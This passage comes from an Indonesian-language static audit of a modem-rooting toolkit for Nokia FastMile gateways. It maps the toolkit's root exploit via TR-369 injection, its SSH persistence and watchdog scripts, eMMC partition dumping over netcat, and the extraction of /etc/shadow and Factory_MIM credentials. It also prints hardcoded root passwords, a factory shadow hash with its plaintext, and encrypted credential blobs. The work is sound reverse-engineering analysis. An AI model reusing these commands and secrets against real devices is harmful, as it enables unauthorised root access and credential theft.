     - Berkas ditulis ke `os.path.join(config.backup_dir, filename)`. Ketika `filename == 'md5sums.txt'` atau berakhiran `'.tar.gz'` (`mod_consts[410..412]`), `self.backup_done_event.set()` dipanggil untuk memberi sinyal bahwa seluruh rangkaian *streaming* telah selesai.
     - Menangani error `errno == 28` (`ENOSPC` / *disk full*, `mod_consts[403..406]`) secara eksplisit.

### 5.2 Pemburu Sesi SSH (`SSHSniper`, Baris 682–758) (OBS, Tinggi)

1. **`wait_for_shutdown(cls, ip, check_ports=(443, 80, 53, 2222), timeout=35)` (`VA 0x180033a60`, `mod_consts[417..433, 1515]`):**
   - Memantau siklus *reboot* modem secara *real-time* menggunakan `socket.create_connection((ip, p), timeout=0.25)` terhadap keempat port `(443, 80, 53, 2222)` (mengoreksi spesifikasi lama yang melewatkan port `443` dan batas waktu `35` detik).
   - Menunggu hingga keempat port tidak merespons sebanyak 2 kali berturut-turut (`consecutive_offline >= 2`) setelah sebelumnya sempat terdeteksi hidup (`saw_online`), lalu mencetak `'Modem terkonfirmasi OFFLINE (memulai siklus restart hardware)!'`.
2. **`snipe(cls, config, timeout_total=240, retry_delay=0.15, wait_shutdown=False)` (`VA 0x180036130`, `mod_consts[443..478, 1518]`):**
   - Melakukan *polling* agresif ke port SSH `(2222, 22)` dengan jeda `0.4` detik saat soket tertutup dan `0.15` detik saat gagal autentikasi.
   - Menggunakan `paramiko.SSHClient()` dengan `AutoAddPolicy()`, `timeout=2.0`, `banner_timeout=2.0`, `auth_timeout=2.0`, `look_for_keys=False`, `allow_agent=False` (`mod_consts[458..460]`), mencoba autentikasi kunci privat (`fastmile_key`) terlebih dahulu lalu *fallback* ke password `config.ssh_pwd`.
   - **Verifikasi Boot Baru (`/proc/uptime`, `mod_consts[461..465]`):** Segera setelah terhubung, menjalankan `cat /proc/uptime` (timeout 2 detik). Jika nilai *uptime* kernel **lebih besar dari `90.0` detik** (`mod_consts[462] = 90.0`), sesi dianggap sesi lama sebelum *reboot* (*dying session*), koneksi ditutup, dan *polling* dilanjutkan.
   - Setelah terkunci pada *boot* baru (`uptime <= 90.0` detik), menjalankan perintah *hardening* SSH (`mod_consts[469..472]`) dan memanggil `cls.install_guardian(client, port)`.
3. **`install_guardian(cls, client, port)` (`VA 0x180035880`, `mod_consts[434..442]`):**
   - Menulis dan menjalankan *watchdog* in-memory `/tmp/ssh_keeper.sh` di latar belakang untuk menahan port `2222` tetap terbuka terhadap penutupan oleh daemon `DMMgr` Nokia.

### 5.3 Mesin Ekstraksi Partisi eMMC (`DumperEngine`, Baris 892–1335) (OBS, Tinggi)

1. **`fetch_emmc_info(cls, ssh_client, config)` (`VA 0x18003e8a0`, `mod_consts[517..614]`):**
   - Membaca atribut sysfs `/sys/block/mmcblk0/device/{cid,csd,name,manfid,oemid,serial,date,prv,type,life_time,pre_eol_info}` dan `/sys/block/mmcblk0/size`.
   - Memetakan `manfid` terhadap kamus vendor eMMC (`mod_consts[541]`, termasuk `0x0000f4` -> `BIWIN (Shenzhen Biwin Storage Technology)` dengan *marking* fisik `BWCMAB811G04G 233254126 1258RD (BIWIN 4GB eMMC 5.1 BGA-153)`).
   - Menyimpan `non-userarea/CID.txt`, `non-userarea/CSD.txt`, dan `non-userarea/info_eMMC.txt`.
2. **`generate_dump_bash(config)` (`VA 0x18003aec0`, `mod_consts[479..488]`):**
   - Menghasilkan skrip shell yang:
     1. Me-*remount* `/tmp` dengan opsi `exec` dan mengunduh `http://<pc_ip>:8081/busybox` ke `/tmp/busybox`.
     2. Mengalirkan `/dev/mmcblk0boot0` dan `/dev/mmcblk0boot1` ke PC dengan header `non-userarea/mmcblk0boot0.bin::::` dan `non-userarea/mmcblk0boot1.bin::::` melalui `/tmp/busybox nc <pc_ip> 8888`, serta mencatat hash MD5-nya ke `/tmp/md5sums.txt`.
     3. Mengekstrak register *Extended CSD* melalui `/sys/kernel/debug/mmc0/mmc0:0001/ext_csd` (`non-userarea/ext_csd.bin::::`) dan/atau `mmc extcsd read /dev/mmcblk0` (`non-userarea/ext_csd.txt::::`).
     4. Melakukan iterasi atas seluruh 50 partisi `/dev/mmcblk0p*`, mengambil nama partisi dari `PARTNAME` pada `/sys/block/mmcblk0/<part>/uevent`, mengalirkan `cat /tmp/header.bin $part | /tmp/busybox nc <pc_ip> 8888` dengan header `<LABEL>.img::::`, dan menambahkan hash MD5 ke `/tmp/md5sums.txt`.
     5. Mengirimkan `/tmp/md5sums.txt` paling akhir dengan header `md5sums.txt::::`.
3. **`execute_dump_ssh(cls, ssh_client, config)` (`VA 0x18004a850`, `mod_consts[644..672]`):**
   - Memeriksa sisa ruang disk PC menggunakan `shutil.disk_usage`; jika kurang dari **`5.0` GB** (`mod_consts[647]`), menampilkan peringatan keras sebelum melanjutkan.
   - Memanggil `fetch_emmc_info`, mengeksekusi skrip dari `generate_dump_bash`, lalu memanggil `update_health_from_extcsd`.
4. **`update_health_from_extcsd(cls, config)` (`VA 0x18004eda0`, `mod_consts[673..689]`):**
   - Jika `non-userarea/ext_csd.bin` diterima, membaca byte pada **offset `267`** (`PRE_EOL_INFO`), **offset `268`** (`DEVICE_LIFE_TIME_EST_TYP_A`), dan **offset `269`** (`DEVICE_LIFE_TIME_EST_TYP_B`) (`mod_consts[677, 679, 680]`) atau mem-parsing `ext_csd.txt`, lalu memperbarui bagian kesehatan chip di `non-userarea/info_eMMC.txt`.
5. **`redump_single_partition(cls, ssh_client, config, label)` (`VA 0x1800487f0`, `mod_consts[615..643]`):**
   - Mengunduh ulang satu partisi spesifik (`boot0`/`boot1` atau partisi user-area berdasarkan `PARTNAME`), memperbarui baris MD5 terkait di `/tmp/md5sums.txt` dengan `sed`, dan mengirim ulang `md5sums.txt::::`.

### 5.4 Verifikasi Integritas MD5 (`MD5Validator`, Baris 1418–1608) (OBS, Tinggi)

- **`calculate_md5(filepath)` (`VA 0x180053670`, `mod_consts[690..701]`):** Menghitung MD5 berkas lokal dalam blok bacaan dengan indikator persentase progres.
- **`verify(cls, target_dir='image_backup', ...)` (`VA 0x1800553a0`, `mod_consts[702..775]`):**
  - Membandingkan daftar hash di `md5sums.txt` terhadap berkas lokal.
  - Partisi yang namanya termasuk dalam `EXCLUDED_PARTITIONS` (`mod_consts[1529]`: `['swr.img', 'userdata', 'swr', 'user_data.img', 'user_data', 'userdata.img']`) diberi status **`WAJAR-RW`** (`Excluded RW`) jika hash-nya berbeda karena partisi tersebut aktif ditulis oleh OS modem saat *live dump*.
  - Menulis laporan lengkap ke `image_backup/report.txt`.
- **`verify_with_auto_retry(cls, ssh_client, config, max_retries=3)` (`VA 0x18005ef50`, `mod_consts[776..817]`):**
  - Jika ditemukan partisi berstatus `KORUP` atau `HILANG`, secara otomatis memanggil `DumperEngine.redump_single_partition` hingga maksimal 3 kali percobaan ulang (`max_retries=3`) per partisi yang gagal.

---

## 6. Inventaris Skrip & Artefak pada Modem (OBS, Tinggi)

| # | Artefak / Skrip | Lokasi di Modem | Metode Pembuat (`VA`) | Fungsi Utama |
|---|---|---|---|---|
| S1 | Skrip Streaming Dump eMMC | Dipipe ke `/bin/sh` via SSH | `DumperEngine.generate_dump_bash` (`0x18003aec0`) | Mengunduh `/tmp/busybox`, mengekstrak `boot0`, `boot1`, `ext_csd`, dan 50 partisi `/dev/mmcblk0p*` via `busybox nc` ke port TCP 8888, diakhiri `md5sums.txt`. |
| S2 | Skrip Streaming Tarball | Dipipe ke `/bin/sh` via SSH | `DumperEngine.generate_tarball_bash` (`0x18003b9b0`) | Mengarsipkan `/data` (`user_data_dir.tar.gz`) dan `/rom/etc` (`rom_etc_dir.tar.gz`) lalu mengalirkannya ke port TCP 8888. |
| S3 | Skrip Detector Injeksi | `/configs/nonpersistant/fastmile_detector` | `FastMileRCE.deploy_detector` (`0x180027eb0`) | Dipanggil oleh daemon AIC saat boot; mengatur password root, memasang `authorized_keys`, mem-patch `/configs/init_action.sh`, menyalakan `sshd` port 2222, dan menjalankan S4. |
| S4 | Keeper Persistensi | `/configs/nonpersistant/fastmile_keeper.sh` & `/tmp/ssh_keeper.sh` (PID `/tmp/fastmile_keeper.pid`) | `deploy_detector` (`0x180027eb0`) & `SSHSniper.install_guardian` (`0x180035880`) | Loop `while true` (interval 2 detik) yang menjaga aturan `iptables` port `2222` dan menghidupkan ulang `/usr/sbin/sshd -p 2222` jika mati. |
| S5 | Salinan Init Action | `/configs/init_action.sh` | `FastMileRCE.deploy_detector` (`0x180027eb0`) | Salinan `/bin/init_action.sh` dengan perintah `killall -9 sshd` dikomentari (`#killall -9 sshd`). |
| S6 | Hook Konfigurasi AIC | `/configs/aic_conf.json` | `FastMileRCE.deploy_detector` (`0x180027eb0`) | Hasil `sed` atas `/etc/hb/aic_conf.json` yang mengganti path `*_detector` menjadi `/bin/sh /configs/nonpersistant/fastmile_detector`. |
| S7 | Perintah Unroot / Cleanup | Dieksekusi via SSH atau `FastMileRCE.execute_rce` | `DbaiNokiaApp.menu_revoke_root` (`0x180089440`) | Membunuh PID `/tmp/fastmile_keeper.pid`, menghapus `/configs/aic_conf.json`, `/configs/init_action.sh`, `/tmp/busybox`, `/tmp/ssh_keeper.sh`, `/configs/nonpersistant/fastmile_*`, `/configs/nonpersistant/rootdone`, lalu `sync`. |
| S8 | Biner BusyBox ARM32 | `/tmp/busybox` | `BusyBoxHandler.do_GET` (`0x18002aad0`) | Biner ELF32 ARM statis (`1.148.524` B, KAX #25) yang diunduh modem dari `http://<pc_ip>:8081/busybox`. |
| S9 | Biner Helper Dekripsi | `/tmp/test_decrypt_node` & `/configs/test_decrypt_node` | `DbaiNokiaApp.extract_live_credentials` (`0x1800930f0`) | Biner ELF64 AArch64 (`131.593` B, KAX #32) yang diunggah dari PC ke modem melalui SFTP (`sftp.put`) untuk memanggil `cfg_db_decryptNodeValue` di `/usr/lib/libcfgdb.so`. |

---

## 7. Bedah Mendalam Menu CLI (`DbaiNokiaApp` & `FactoryMIMExtractor`)

Prompt menu utama di `DbaiNokiaApp.main_loop` (`VA 0x1800a3e20`, `mod_consts[1398]`):  
`Pilih opsi [a, 1-8, n, s, i, r, k, m, 0]: `

| Opsi / Alias Input (`mod_consts[1405..1416]`) | Nama Fitur di Menu | Metode Penangan (`VA`) |
|---|---|---|
| `[a]` | Full Pipeline: Generate SSH Key → Root → Reboot → Sniper → Servers → Dump 52 Partisi → MD5 → Ekstraksi Kredensial | `run_full_pipeline` (`0x18007df60`) |
| `[1]` | Periksa / Generate Pasangan SSH Key (`fastmile_key` & `fastmile_key.pub`) | `SSHKeyManager.ensure_keys` (`0x180019f10`) |
| `[2]` | Aktivasi SSH (ROOT) via injeksi TR-369 | `menu_root_exploit` (`0x180088540`) |
| `[3]` | Trigger Reboot Modem (`/reboot_web_app.cgi` atau SSH `reboot`) | `menu_reboot` (`0x1800812a0`) |
| `[4]` | Mulai SSH Sniper & Buka Terminal Interaktif (`ssh` native OS) | `menu_sniper` (`0x180083fe0`) + `open_interactive_shell` (`0x180085c70`) |
| `[5]` | Jalankan Background Server (`HTTP:8081` + `TCP:8888`) | `menu_servers` (`0x18008c160`) |
| `[6]` | Full Dump Partisi eMMC via SSH (50 partisi user-area + `boot0`/`boot1` + `ext_csd`) | `menu_dump_ssh` (`0x18008c8e0`) |
| `[7]` | Verifikasi Hash MD5 Checksum Hasil Backup (+ auto-retry ≤3×) | `menu_verify_md5` (`0x18008e280`) |
| `[8]` | Backup Direktori (`/data` & `/rom/etc`) [Opsional] | `menu_tarball` (`0x18008d640`) |
| `[n]` (alias: `w`, `f`, `openwrt`) | Flash Custom Firmware OpenWrt (Troll / Community Easter Egg) | `menu_openwrt_troll` (`0x18009d340`) |
| `[s]` | Ubah Password SuperAdmin (Web GUI) | `menu_change_superuser_pwd` (`0x18008fcc0`) |
| `[i]` | Ekstrak Data Identitas & Kredensial Pabrik (`Factory_MIM`) | `menu_extract_factory_mim` (`0x1800994a0`) |
| `[r]` | Unroot / Revoke Akses Root (via SSH atau *fallback* Web API) | `menu_revoke_root` (`0x180089440`) |
| `[k]` | Ubah Konfigurasi (6 opsi pengaturan) | `menu_config` (`0x1800a1a60`) |
| `[m]` (alias: `o`, `u`, `ota`) | Trigger OTA Update (Nokia Cloud FOTA) | `menu_trigger_ota` (`0x18009ee70`) |
| `[0]` | Keluar & Hentikan Background Server | `main_loop` (`0x1800a3e20`) |

### 7.1 Menu `[i]` — Ekstraksi `Factory_MIM`, Analisis `bin\test_decrypt_node`, & Integrasi Hashcat (OBS, Tinggi)

1. **Format Blok `Factory_MIM` (`FactoryMIMExtractor.parse_mim_block`, `VA 0x1800630b0`, `mod_consts[818..828, 1535]`):**
   - Mencari *magic needle* `b'5GGW2-OMNI-2\x00'` (`mod_consts[820]`), mundur `64` byte (`mod_consts[821]`) ke awal kunci `'Product'`, lalu membaca pasangan `key` (64 byte NUL-padded) dan `value` (64 byte NUL-padded) dengan perataan **128 byte** (`mod_consts[822]`) sepanjang maksimal **`8.192` byte** (`mod_consts[827]`).
   - Daftar 24 kunci kanonis (`KNOWN_KEYS`, `mod_consts[1535]`): `['Product', 'Password', 'ACSPassword', 'ACSCRPassword', 'RootPassword', 'Format', 'FactoryCode', 'HWVersion', 'ICS', 'SN', 'CLEI', 'Mnemonic', 'ProgDate', 'MACAddress', 'PartNbr', 'PartNbrRev', 'OperatorID', 'CountryID', 'IMEI', 'PartNbr2', 'PartNbrRev2', 'PartNbr3', 'PartNbrRev3', 'WiFiPassword']`.
   - Field `Password` di `Factory_MIM` disimpan dalam bentuk Base64 atas digest SHA-256 biner dari password Web Admin pabrik; `format_credentials` mendekodenya dengan `base64.b64decode(v).hex()` (`mod_consts[900..901]`).
2. **Mode Live via SSH (`DbaiNokiaApp.extract_live_credentials`, `VA 0x1800930f0`, `mod_consts[1260..1290]`):**
   - Menjalankan perintah gabungan via SSH (`mod_consts[1264]`):
     `cat /dev/block/Factory_MIM 2>/dev/null | head -c 8192 ; echo '---SHADOW_SPLIT---' ; grep '^root:' /etc/shadow 2>/dev/null ; echo '---NODE_SPLIT---' ; mount -o remount,exec /tmp 2>/dev/null ; cp /configs/test_decrypt_node /tmp/test_decrypt_node 2>/dev/null ; /tmp/test_decrypt_node 2>/dev/null`
   - **Mekanisme Unggah SFTP `bin\test_decrypt_node` (`mod_consts[1267..1273]`):** Jika keluaran bagian ketiga tidak memuat `'superadmin (current/preset)'`, fungsi mencari biner lokal `bin/test_decrypt_node` (entri KAX #32 di dalam bundel Nuitka), membuka sesi SFTP (`ssh_client.open_sftp()`), mengunggah berkas ke `/tmp/test_decrypt_node` (`sftp.put`), mengatur izin `chmod 755 /tmp/test_decrypt_node && cp /tmp/test_decrypt_node /configs/test_decrypt_node`, lalu mengeksekusi `/tmp/test_decrypt_node`.
3. **Bedah Biner ELF64 AArch64 `bin\test_decrypt_node` (KAX #32, Offset `0x2233d12`, `131.593` B) (OBS, Tinggi):**
   - Header ELF: 64-bit LSB shared object/PIE (`e_type = 3`, `e_machine = 0xb7` `EM_AARCH64`), tidak di-*strip* (memiliki `.symtab` di offset `0x10098` dan `.strtab` di `0x10950`), dikompilasi dari `test_decrypt_node.c` menggunakan `GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0`, dan dimodifikasi dengan `patchelf` (`rpath = /usr/lib:/lib`, `.interp` dipindah ke offset `0x20000`).
   - **Perilaku Fungsi `main` (`0x0009d8`, ukuran 428 B):**
     - Memanggil `dlopen("/usr/lib/libcfgdb.so", RTLD_NOW)` dan mengambil simbol `dlsym(handle, "cfg_db_decryptNodeValue")`.
     - **Koreksi Kritis terhadap Spesifikasi Lama:** Program ini **sama sekali tidak membaca berkas `/configs/config_encryption.cfg` di modem**. Sebaliknya, `.rodata` (`0x000b98`–`0x000dfc`) dan `.data` (`0x010000`) menyimpan tabel berisi **5 pasang label dan *ciphertext* Base64 statis**:
       1. `"admin (ground truth)"` → `"WtWho5AllXU9LfBQqsFt01A4CVXr+ddzi/IK+WiQb0qI233VrgUOCepipbvd03F348dwx93NsSAMk06K9c0dZUC6atGR/m/vZiDf8JJr7gQ="`
       2. `"superadmin (current/preset)"` → `"+j/dPY1c7mbTcKwWk9iZaET6Kx9ysy9TJUpiEXFhj1TpB+uaVR+nE/0E2FdxVDTp17P5+x9GK8W/wsrA5ccLwbhPpvDGUAXhSkbekEj/8Dw="`
       3. `"superadmin dv"` → `"F4xNLuhHIIM13ygI1uVY3w=="`
       4. `"telecomadmin"` → `"ziYNEtl8EiGW/slOX+w8rg=="`
       5. `"Wlan secret"` → `"H+f7T34NQyIDTxDM5AqmVg=="`
     - Untuk setiap entri, `main` memanggil `cfg_db_decryptNodeValue(enc_str, out_buf, ...)` dan mencetak:
       ```text
       [RESULT] <label>:
         ENC: <enc_str>
         DEC: <decrypted_64_hex_sha256>
       ```
     - Karena *ciphertext* `superadmin (current/preset)` di-*hardcode* di dalam `test_decrypt_node.c`, biner tersebut sebenarnya hanya mendekripsi *ciphertext* preset yang sudah tertanam di dalam `test_decrypt_node` menggunakan kunci perangkat/pustaka `libcfgdb.so` milik modem.
4. **Mode Offline (`scan_file_or_dump` `0x180064f50` & `extract_from_folder` `0x180067780`):**
   - Dapat memindai berkas partisi kecil (`Factory_MIM.img`) maupun *raw full dump* berukuran multi-gigabyte dalam blok 16 MiB (`16.777.216` B, `mod_consts[837]`) dengan *overlap* 1 MiB (`1.048.576` B, `mod_consts[838]`).
5. **Pencocokan Potfile Hashcat (`lookup_potfile`, `VA 0x180069f20`, `mod_consts[868..879]`):**
   - Mencari apakah hash SHA-256 64-heksadesimal sudah ada di `tools/hashcat-8.0.0/hashcat.potfile`, `~/.hashcat/hashcat.potfile`, atau `~/.local/share/hashcat/hashcat.potfile`.

### 7.2 Menu `[s]` — Pengubahan Password SuperAdmin (`menu_change_superuser_pwd`, `VA 0x18008fcc0`) (OBS, Tinggi)

- Meminta input password baru dari pengguna (atau menggunakan nilai default bawaan jika pengguna menekan Enter).
- **Koreksi Spesifikasi:** Menghitung hash SHA-256 dalam huruf besar (`pwd_sha256 = hashlib.sha256(new_pwd.encode()).hexdigest().upper()`, `mod_consts[1230, 1237]`) dan mengeksekusi perintah SSH (`mod_consts[1243..1244]`, timeout 15 detik):
  ```sh
  cfgcli -s InternetGatewayDevice.X_Authentication.WebAccount.Enable 1 && \
  cfgcli -s InternetGatewayDevice.X_Authentication.WebAccount.Password <PWD_SHA256_UPPER> && \
  cfgcli --save-db
  ```

### 7.3 Menu `[m]` — Trigger OTA Update (`menu_trigger_ota`, `VA 0x18009ee70`, `mod_consts[1325..1351]`) (OBS, Tinggi)

Menjalankan 5 langkah berurutan melalui SSH di modem (mengoreksi spesifikasi lama yang melewatkan langkah 1, 2, 3, dan 5):
1. Membaca versi firmware aktif: `cat /etc/version 2>/dev/null || uname -a` (`mod_consts[1330]`).
2. Mengaktifkan modul Software Management di datamodel TR-069 (`mod_consts[1337]`):
   `cfgcli -s InternetGatewayDevice.X_ALU-COM_Wifi.X_ALU-COM_SwMgnt.X_ALU-COM_Enable true 2>/dev/null && cfgcli --save-db 2>/dev/null`
3. Me-restart daemon `swmgnt` (`mod_consts[1339]`):
   `killall -9 swmgnt 2>/dev/null ; /usr/bin/swmgnt &`
4. Memicu sinyal D-Bus dan script OTA (`mod_consts[1341]`):
   `dbus-send --system --type=signal /nokia/swmgnt nokia.swmgnt.triggerOtaPollingFromPortal 2>/dev/null ; dbus-send --system --type=signal /nokia/swmgnt nokia.swmgnt.pollMatrixFromCloud 2>/dev/null ; sysevent set OTATrigger 1 2>/dev/null ; /bin/swm.sh OTATrigger 1 2>/dev/null`
5. Menunggu 5 detik lalu membaca log FOTA (`mod_consts[1345]`):
   `cat /logs/download_data_From_clould.txt 2>/dev/null || cat /tmp/init_script.log 2>/dev/null | tail -n 20`

### 7.4 Menu `[r]` — Unroot / Revoke Akses Root (`menu_revoke_root`, `VA 0x180089440`, `mod_consts[1182..1203]`) (OBS, Tinggi)

- **Jalur Utama (via SSH):** Jika sesi SSH terhubung, mengeksekusi perintah pembersihan S7 (`mod_consts[1189]`, timeout 10 detik) dan memeriksa `stdout.channel.recv_exit_status()`.
- **Jalur Fallback (via Web Management API — Terbukti Lengkap di `mod_consts[1193..1197]`):** Jika SSH tidak aktif atau gagal, fungsi menginstansiasi `rce = FastMileRCE(self.config.modem_ip, self.config.web_user, self.config.web_pwd)`, memanggil `rce.login()`, lalu menjalankan perintah pembersihan S7 melalui `rce.execute_rce(cleanup_cmd)`.
- Setelah pembersihan berhasil, menawarkan *reboot* modem otomatis via SSH (`reboot`) atau *fallback* `rce.reboot_modem()`.

### 7.5 Menu `[n]` (`menu_openwrt_troll`, `VA 0x18009d340`) & Menu `[k]` (`menu_config`, `VA 0x1800a1a60`) (OBS, Tinggi)

- **Menu `[n]` (`mod_consts[1313..1324]`):** Murni *easter egg* komunitas; hanya mencetak teks simulasi dan tautan gambar GitHub serta unggahan Facebook tanpa melakukan operasi *flashing* apa pun.
- **Menu `[k]` (`mod_consts[1352..1375]`):** Menampilkan dan mengubah **6 parameter konfigurasi** (mengoreksi spesifikasi lama yang hanya mencatat 4 opsi):
  1. `IP Modem` (`modem_ip`, default `192.168.1.1`)
  2. `Password Web Admin` (`web_pwd`)
  3. `Password Root SSH` (`ssh_pwd`)
  4. `Port HTTP Server` (`http_port`, default `8081`)
  5. `Port TCP Receiver` (`tcp_port`, default `8888`)
  6. `Folder Output` (`backup_dir`, default `image_backup`)

---

## 8. Inventaris Nilai Hardcoded, Kredensial, & Konfigurasi di Biner Asli (OBS, Tinggi)

Tabel dan rincian berikut mendokumentasikan seluruh nilai *hardcoded* (password default, pasangan hash `/etc/shadow`, *ciphertext* `libcfgdb.so`, parameter jaringan, serta konstanta perangkat keras) yang diekstrak dari `_nuitka_temp.dll` (`dbai_nokia.dll`) dan `bin\test_decrypt_node`:

| Kategori / Item | Lokasi di Biner / Slot `mod_consts` | Nilai Hardcoded Eksak (OBS) | Mekanisme Penggunaan di Aplikasi Asli |
|---|---|---|---|
| Password Root SSH (`ssh_pwd`) | `Config.__init__` (`mod_consts[42]`), `deploy_detector` (`mod_consts[299]`), `SSHSniper.snipe` (`mod_consts[469]`) | `FastMileR00t!` | Nilai default `self.ssh_pwd` saat inisialisasi; juga disetel ke akun `root` modem via `echo "root:FastMileR00t!" \| chpasswd`. |
| Password SuperAdmin Baru | `menu_change_superuser_pwd` (`0x18008fcc0`, `mod_consts[1235..1236]`) | `DBAI2K27` | Nilai default pada prompt `[?] Masukkan Password SuperAdmin baru [Default: DBAI2K27]: ` bila pengguna menekan Enter; di-hash SHA-256 *uppercase* lalu ditulis via `cfgcli -s`. |
| Hash Shadow Root Pabrik (`KNOWN_ROOT_HASH` & `KNOWN_ROOT_PASS`) | `FactoryMIMExtractor` (`mod_consts[1538..1539]`, offset berkas `0x1128067`) | Hash: `$5$h9AY67gazvN9fEl5$4sI08TV8DiAV/3Lgv/QZnokbiM8MWabqQlXdM/BtySC`<br>Plaintext: `iHe,JtCJkCMetyXG` | Dicocokkan langsung dengan baris `root:` dari `/etc/shadow` untuk menampilkan password root konsol/UART bawaan pabrik tanpa menjalankan Hashcat. |
| Hash Shadow Root Toolkit (`DEFAULT_FASTMILE_HASH` & `DEFAULT_FASTMILE_PASS`) | `FactoryMIMExtractor` (`mod_consts[1540]`, offset berkas `0x11280b8`) | Hash: `$5$h9AY67gazvN9fEl5$QMQ00BPno6Bvbbr9Vxdw9M4qcB3cU759mjfTEvZp5H/`<br>Plaintext: `FastMileR00t!` | Dicocokkan dengan `/etc/shadow` jika password root modem sudah diganti oleh toolkit menjadi `FastMileR00t!`. |
| Komentar Kunci Publik SSH | `SSHKeyManager.ensure_keys` (`0x180019f10`, `mod_consts[139]`) | ` dbai@<hostname>` | Akhiran komentar yang ditambahkan pada `fastmile_key.pub` (format OpenSSH). |
| Parameter Jaringan & Path Default | `Config.__init__` (`0x180010f50`, `mod_consts[39..48]`) | `modem_ip = "192.168.1.1"`, `web_user = "admin"`, `ssh_user = "root"`, `ssh_ports = [2222, 22]`, `key_name = "fastmile_key"`, `http_port = 8081`, `tcp_port = 8888`, `backup_dir = "image_backup"` | Nilai awal sebelum ditimpa oleh `config_toolkit.json`. |
| User-Agent HTTP CGI | `FastMileRCE._open` (`0x18001c600`, `mod_consts[188]`) | `Mozilla/5.0 (DBAI-Nokia-Toolkit)` | Dikirim pada setiap request HTTP `GET`/`POST` ke Web CGI modem. |
| Marking Fisik Chip eMMC BIWIN | `DumperEngine.fetch_emmc_info` (`0x18003e8a0`, `mod_consts[550]`) | `BWCMAB811G04G 233254126 1258RD (BIWIN 4GB eMMC 5.1 BGA-153)` | Dicetak otomatis ke layar dan `non-userarea/info_eMMC.txt` apabila `manfid` sysfs bernilai `0x0000f4`. |
| 5 Ciphertext Statis `libcfgdb.so` | `bin\test_decrypt_node` (`.rodata` `0x000b98`–`0x000dfc` & `.data` `0x010000`) | Lihat tabel 5 entri di §7.1 butir 3 (`WtWho5Al...`, `+j/dPY1c...`, `F4xNLuhH...`, `ziYNEtl8...`, `H+f7T34N...`) | Didekripsi di modem menggunakan `cfg_db_decryptNodeValue` dari `/usr/lib/libcfgdb.so`. |
| `config_toolkit.json` | `Config.load_saved_config` (`0x1800131c0`) & `save_config` (`0x180014fb0`) | Menyimpan `modem_ip`, `web_pwd`, `ssh_pwd`, dan `backup_dir` | Disimpan sebagai JSON *plaintext* (`indent=4`) di direktori kerja/eksekusi. |
| Kunci AES-128, IV, Token Sesi | `FastMileRCE.login` & `_enc_post` | Dibuat dinamis per sesi (`os.urandom(16)`) | Digunakan untuk enkripsi payload `POST` pasca-login (§4.4). |

---

## 9. Destinasi Jaringan (OBS, Tinggi)

Seluruh komunikasi jaringan yang ditemukan di dalam 1.583 konstanta modul `.__main__` dan tabel impor PE:

| Destinasi / Port | Arah | Protokol / Pustaka | Fungsi Penggunaan |
|---|---|---|---|
| `http://<modem_ip>:80` (default `192.168.1.1`) | PC → Modem | HTTP (`urllib.request`) | Autentikasi `/login_web_app.cgi*`, injeksi `/tr369_web_app.cgi?set_params`, polling `/tr369_status_web_app.cgi`, reboot `/reboot_web_app.cgi`. |
| `<modem_ip>:443, 80, 53, 2222` | PC → Modem | TCP Socket (`socket.create_connection`) | Deteksi siklus *shutdown* modem pada `SSHSniper.wait_for_shutdown`. |
| `<modem_ip>:2222, 22` | PC → Modem | SSHv2 / SFTP (`paramiko` & `ssh` OS) | `SSHSniper.snipe`, eksekusi skrip dump/OTA/cfgcli, unggah SFTP `bin/test_decrypt_node`, dan terminal interaktif. |
| `http://<pc_ip>:8081/busybox` | Modem → PC | HTTP (`http.server` / `BusyBoxHandler`) | Penyajian biner `bin\busybox` ARM32 ke modem (`curl -s -o /tmp/busybox`). |
| `<pc_ip>:8888` | Modem → PC | Raw TCP (`socket` / `busybox nc`) | Penerimaan aliran citra 52 partisi eMMC, `ext_csd`, tarball `/data` & `/rom/etc`, serta `md5sums.txt` dengan pembatas `::::`. |
| `https://swupd.wifi.nokia.com` | Modem → Cloud Nokia | HTTPS (dipicu via D-Bus di modem) | Server FOTA resmi Nokia yang dihubungi oleh daemon `/usr/bin/swmgnt` saat Menu `[m]` dijalankan. |
| `github.com/armarchindo/nokia-gateway-2/...` & `web.facebook.com/...` & `fb.com/groups/ihabt` | Hanya Teks UI | Tidak ada koneksi jaringan dari kode | Ditampilkan sebagai teks informasi di *header* aplikasi dan *easter egg* Menu `[n]`. |

**Verifikasi Absensi Eksfiltrasi (OBS, Tinggi):** Tidak ditemukan URL atau alamat IP menuju Telegram, Discord, Pastebin, webhook, maupun server telemetri eksternal di seluruh 1.583 konstanta aplikasi.

---

## 10. Verdict Fitur terhadap Klaim README v1.1 (Telah Dikoreksi)

| Kode | Klaim README v1.1 | Verdict Audit | Dasar Bukti Statis |
|---|---|---|---|
| V-01 | "Compiled to native C machine code", "Zero-Dependency" | **Tidak Benar (Marketing)** | OBS: Biner adalah bundel *onefile* Nuitka berisi runtime `python313.dll` (CPython 3.13.14) + `dbai_nokia.dll` + 35 berkas pendukung (§2.1, §2.2). |
| V-02 | Full pipeline `[a]` (Key → Root → Reboot → Sniper → Server → Dump 52 partisi → MD5 → Kredensial) | **Hadir Lengkap** | OBS: `DbaiNokiaApp.run_full_pipeline` (`0x18007df60`) memanggil seluruh tahapan secara berurutan. |
| V-03 | Ekstraksi identitas pabrik & audit kredensial `[i]` (Mode Live & Offline + Hashcat potfile) | **Hadir (dengan Catatan Teknis)** | OBS: `menu_extract_factory_mim` (`0x1800994a0`) & `extract_live_credentials` (`0x1800930f0`). Catatan: `bin\test_decrypt_node` mendekripsi *ciphertext* yang di-*hardcode* di dalam `test_decrypt_node.c` via `libcfgdb.so`, bukan membaca `/configs/config_encryption.cfg` (§7.1). |
| V-04 | Pengubahan password SuperAdmin `[s]` ke `/configs` | **Hadir** | OBS: `menu_change_superuser_pwd` (`0x18008fcc0`) menulis SHA-256 huruf besar via `cfgcli -s` + `cfgcli --save-db`. Efek pembukaan menu Cell/Band Lock adalah sifat Web UI modem, bukan kode di biner PC. |
| V-05 | Trigger OTA `[m]` via `swupd.wifi.nokia.com` & sinyal D-Bus | **Hadir Lengkap** | OBS: `menu_trigger_ota` (`0x18009ee70`) mengaktifkan `X_ALU-COM_SwMgnt` via `cfgcli`, me-restart `swmgnt`, mengirim sinyal D-Bus, dan membaca log FOTA (§7.3). |
| V-06 | Streaming dump kecepatan tinggi via TCP 8888 ("Zero RAM buffer") | **Hadir** | OBS: `DumperEngine.generate_dump_bash` (`0x18003aec0`) mengalirkan blok partisi langsung ke `busybox nc` dengan pembatas `::::` tanpa menyimpan file `.img` di `/tmp` modem. |
